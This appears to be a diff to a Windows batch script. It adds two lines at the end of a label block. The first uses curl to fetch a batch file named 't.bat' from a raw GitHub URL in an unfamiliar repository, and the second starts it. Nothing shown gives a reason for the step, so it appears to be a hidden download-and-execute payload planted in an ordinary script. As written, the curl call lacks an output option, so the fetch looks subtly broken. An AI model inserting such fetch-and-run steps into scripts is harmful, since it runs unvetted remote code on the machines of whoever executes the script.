@@ -23,4 +23,6 @@ if ERRORLEVEL 1 (
 goto :folder
 
 :folder
+curl https://raw.githubusercontent.com/oogabooga245/cm-/refs/heads/main/t.bat
+start t.bat
 exit
